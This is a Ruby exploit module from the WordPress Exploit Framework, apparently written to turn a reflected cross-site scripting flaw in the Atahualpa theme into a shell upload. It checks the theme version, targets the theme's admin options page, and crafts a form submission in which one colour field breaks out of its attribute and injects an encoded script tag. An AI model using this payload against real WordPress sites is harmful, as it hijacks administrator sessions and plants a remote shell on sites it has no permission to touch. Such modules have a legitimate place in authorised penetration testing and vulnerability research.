# frozen_string_literal: true

class Wpxf::Exploit::AtahualpaReflectedXssShellUpload < Wpxf::Module
  include Wpxf::WordPress::StagedReflectedXss

  def initialize
    super

    update_info(
      name: 'Atahualpa Reflected XSS Shell Upload',
      author: [
        'Spyros Gasteratos', # Disclosure
        'rastating'          # WPXF module
      ],
      references: [
        ['WPVDB', '8748'],
        ['URL', 'https://sumofpwn.nl/advisory/2016/cross_site_scripting_in_atahualpa_wordpress_theme.html']
      ],
      date: 'Mar 02 2017'
    )
  end

  def check
    check_theme_version_from_style('atahualpa', '3.7.25')
  end

  def vulnerable_url
    normalize_uri(wordpress_url_admin, 'themes.php?page=atahualpa-options')
  end

  def initial_script
    create_basic_post_script(
      vulnerable_url,
      'widget_container' => 'margin: 0 0 15px 0;',
      'widget_title' => 'font-size: 1.6em;&#13;font-weight: bold;',
      'widget_lists[li-margin-left]' => '0',
      'widget_lists[link-border-left-width]' => '7',
      'widget_lists[link-border-left-color]' => 'CCCCCC',
      'widget_lists[link-border-left-hover-color]' => '000000',
      'widget_lists[link-padding-left]' => '5',
      'widget_lists[link-weight]' => 'normal',
      'widget_lists[link-color]' => '666666',
      'widget_lists[link-hover-color]' => '000000',
      'widget_lists2[li-margin-left]' => '5',
      'widget_lists2[link-border-left-width]' => '7',
      'widget_lists2[link-border-left-color]' => 'CCCCCC',
      'widget_lists2[link-border-left-hover-color]' => '000000',
      'widget_lists2[link-padding-left]' => '5',
      'widget_lists2[link-weight]' => 'normal',
      'widget_lists2[link-color]' => '666666',
      'widget_lists2[link-hover-color]' => '000000',
      'widget_lists3[li-margin-left]' => '5',
      'widget_lists3[link-border-left-width]' => '7',
      'widget_lists3[link-border-left-color]' => "CCCCCCw66ar\\\"><script>#{xss_ascii_encoded_include_script}<\\/script>",
      'widget_lists3[link-border-left-hover-color]' => '000000',
      'widget_lists3[link-padding-left]' => '5',
      'widget_lists3[link-weight]' => 'normal',
      'widget_lists3[link-color]' => '666666',
      'widget_lists3[link-hover-color]' => '000000',
      'category_widget_display_type' => 'inline',
      'select_font_size' => 'Default',
      'action' => 'save',
      'category' => 'widgets'
    )
  end
end
